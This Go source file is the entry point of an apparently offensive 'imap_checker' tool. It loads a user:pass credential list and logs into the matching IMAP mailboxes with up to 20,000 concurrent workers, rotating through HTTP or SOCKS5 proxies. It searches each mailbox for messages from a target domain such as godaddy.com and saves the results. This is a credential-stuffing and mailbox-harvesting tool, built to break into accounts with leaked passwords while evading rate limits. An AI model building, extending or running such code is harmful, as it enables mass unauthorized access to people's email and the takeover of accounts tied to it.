package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"imap_checker/internal/checker"
	"imap_checker/internal/db"
	"imap_checker/internal/progress"
	"imap_checker/internal/proxy"
	"imap_checker/internal/searcher"
)

const maxWorkers = 20000

func main() {
	inputFlag := flag.String("input", "", "credential file (user:pass per line) [required]")
	workersFlag := flag.Int("workers", 0, "concurrent goroutines (hard cap 20000) [required]")
	targetFlag := flag.String("target", "", "domain to search in FROM header, e.g. godaddy.com [required]")
	proxiesFlag := flag.String("proxies", "", "HTTP-CONNECT proxy file (ip:port per line) [optional]")
	proxyURLFlag := flag.String("proxy-url", "", "SOCKS5 proxy list URL, refreshed periodically [optional]")
	proxyRefreshFlag := flag.Duration("proxy-refresh", 10*time.Minute, "interval to re-fetch -proxy-url")
	dbFlag := flag.String("db", "./Servers.db", "path to Servers.db")
	outFlag := flag.String("out", "./search_out", "output directory")
	flag.Parse()

	if *inputFlag == "" {
		fmt.Fprintln(os.Stderr, "error: -input is required")
		flag.Usage()
		os.Exit(1)
	}
	if *workersFlag <= 0 {
		fmt.Fprintln(os.Stderr, "error: -workers must be a positive integer")
		flag.Usage()
		os.Exit(1)
	}
	if *targetFlag == "" {
		fmt.Fprintln(os.Stderr, "error: -target is required")
		flag.Usage()
		os.Exit(1)
	}
	if *proxiesFlag != "" && *proxyURLFlag != "" {
		fmt.Fprintln(os.Stderr, "error: cannot use -proxies and -proxy-url together")
		flag.Usage()
		os.Exit(1)
	}

	workers := *workersFlag
	if workers > maxWorkers {
		log.Printf("warning: -workers=%d exceeds cap %d, clamping", workers, maxWorkers)
		workers = maxWorkers
	}

	// ── Phase 1: Setup ────────────────────────────────────────────────────────

	log.Printf("reading credentials from %s ...", *inputFlag)
	creds, err := checker.ParseFile(*inputFlag)
	if err != nil {
		log.Fatalf("parse credentials: %v", err)
	}
	log.Printf("loaded %d credentials", len(creds))

	domains := checker.UniqueDomains(creds)
	log.Printf("resolving %d unique domains from %s ...", len(domains), *dbFlag)
	domainMap, err := db.BatchLookup(*dbFlag, domains)
	if err != nil {
		log.Fatalf("db lookup: %v", err)
	}
	found, fallback := countMap(domainMap)
	log.Printf("domain resolution complete: %d in DB, %d fallback (imap.<domain>:993)", found, fallback)

	pool, stopPoller := loadProxyPool(*proxiesFlag, *proxyURLFlag, *proxyRefreshFlag)
	defer stopPoller()

	writer, err := searcher.NewWriter(*outFlag)
	if err != nil {
		log.Fatalf("create output dir: %v", err)
	}
	stopFlush := writer.StartAutoFlush()

	// ── Phase 2: Concurrent search ────────────────────────────────────────────

	bar := progress.New(int64(len(creds)))
	src := searcher.New(domainMap, pool, writer, bar, *targetFlag)
	stopBar := bar.Start()

	credChan := make(chan checker.Credential, workers*2)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range credChan {
				src.Search(cred)
			}
		}()
	}
	for _, c := range creds {
		credChan <- c
	}
	close(credChan)
	wg.Wait()

	// ── Shutdown ──────────────────────────────────────────────────────────────

	stopFlush()
	stopBar()
	if err := writer.Close(); err != nil {
		log.Printf("warning: output writer errors (results may be incomplete): %v", err)
	}
	fmt.Printf("\nResults saved to %s/\n", *outFlag)
}

func loadProxyPool(proxiesPath, proxyURL string, refresh time.Duration) (*proxy.Pool, func()) {
	if proxyURL != "" {
		pool := proxy.New(proxy.KindSOCKS5)
		stop, err := proxy.StartURLPoller(pool, proxyURL, refresh, log.Default())
		if err != nil {
			log.Fatalf("proxy URL poller: %v", err)
		}
		log.Printf("loaded SOCKS5 proxies from %s (refresh every %s)", proxyURL, refresh)
		return pool, stop
	}
	pool, err := proxy.LoadFile(proxiesPath)
	if err != nil {
		log.Fatalf("load proxies: %v", err)
	}
	if pool.Len() > 0 {
		log.Printf("loaded %d HTTP-CONNECT proxies from %s", pool.Len(), proxiesPath)
	} else {
		log.Printf("no proxy configured — using direct dial")
	}
	return pool, func() {}
}

func countMap(m map[string]db.ServerInfo) (found, fallback int) {
	for _, v := range m {
		if v.Fallback {
			fallback++
		} else {
			found++
		}
	}
	return
}
